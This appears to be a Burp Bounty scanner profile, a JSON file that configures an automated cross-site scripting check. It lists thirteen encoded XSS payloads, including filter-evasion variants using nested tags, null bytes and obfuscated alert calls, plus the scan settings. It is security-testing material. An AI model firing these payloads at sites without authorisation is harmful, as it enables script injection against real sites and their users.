[
  {
    "ProfileName": "XSS_HtmlUrlEncode",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true,\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e",
      "true,\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e.",
      "true,\u003csvg/oNLoAd\u003dalert(1)\u003e",
      "true,\u003cmarquee loop\u003d1 width\u003d0 onfinish\u003dalert(2)\u003e",
      "true,\"\u003e\u003cScriPT\u003ea\u003d/XSS/.alert(a.source)\u003c/ScriPT\u003e",
      "true,\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003cscript\u003eipt\u003e",
      "true,\u003cscript\u003ealert(String.fromCharCode(88,83,83))\u003c/script\u003e",
      "true,\u003cdiv onpointerover\u003d\"alert(1)\"\u003exss\u003c/div\u003e",
      "true,\u003cvideo/poster/onerror\u003dalert(1)\u003e",
      "true,\u003csc%00ript\u003ealert/**/(1)\u003c/sc%00ript\u003e",
      "true,\u003csc%00ript\u003ealert/**/(1)\u003c/script\u003e",
      "true,\u003csvg onload\u003d\u0027new Function`[\"XSS\"].find(al\\u0065rt)`\u0027\u003e",
      "true,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e"
    ],
    "Encoder": [
      "HTML-encode all characters"
    ],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026;#",
    "Grep": [],
    "Tags": [
      "All",
      "XSS"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": true,
    "OnlyHTTP": false,
    "IsContentType": true,
    "ContentType": "text/html",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 4,
    "Scope": 0,
    "RedirType": 2,
    "MaxRedir": 3,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "XSS_HtmlUrlEncode",
    "IssueSeverity": "Medium",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]